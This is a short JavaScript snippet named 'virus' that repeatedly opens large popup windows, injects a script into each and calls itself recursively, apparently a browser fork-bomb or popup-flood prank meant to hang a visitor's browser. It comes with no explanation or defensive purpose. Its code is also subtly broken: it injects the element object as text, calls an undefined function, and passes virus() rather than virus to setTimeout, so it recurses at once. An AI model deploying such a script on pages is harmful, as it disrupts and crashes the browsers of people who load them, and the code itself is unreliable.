function virus() 
{
	const newWin = window.open("", "", "height=800,width=800");
	const forkScript = newWin.document.createElement("script"); 
	forkScript.innerHTML = forkScript + "\n" + "forkScript();"; 
	newWin.document.head.appendChild(forkScript); 
	setTimeout(virus(), 100) 
} 
virus();